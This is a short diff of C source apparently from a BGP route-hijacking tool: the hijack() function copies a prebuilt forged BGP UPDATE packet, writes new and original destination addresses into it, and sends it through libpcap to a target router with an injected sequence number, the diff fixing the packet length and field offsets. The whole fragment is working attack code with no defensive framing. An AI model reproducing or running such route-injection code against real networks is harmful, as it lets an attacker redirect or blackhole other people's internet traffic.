@@ -62,11 +62,11 @@ bool open_conn(pcap_t* handle, uint8_t* target, uint8_t* ndest, uint8_t* gateway
 bool hijack(pcap_t* handle, uint8_t* target, uint8_t* odest, uint8_t* ndest, uint8_t* gateway, uint32_t seq) {
 	u_char pkt[100];
 
-	memcpy(pkt, bgp_update_prebuilt, 42);
-	memcpy(&pkt[33], ndest, 4);
-	memcpy(&pkt[38], odest, 4);
+	memcpy(pkt, bgp_update_prebuilt, 46);
+	memcpy(&pkt[37], ndest, 4);
+	memcpy(&pkt[42], odest, 4);
 	
-	return send_bgp(handle, ndest, target, gateway, pkt, 42, seq);
+	return send_bgp(handle, ndest, target, gateway, pkt, 46, seq);
 }
 
 bool keepalive(pcap_t* handle, uint8_t* target, uint8_t* ndest, uint8_t* gateway, uint32_t seq) {
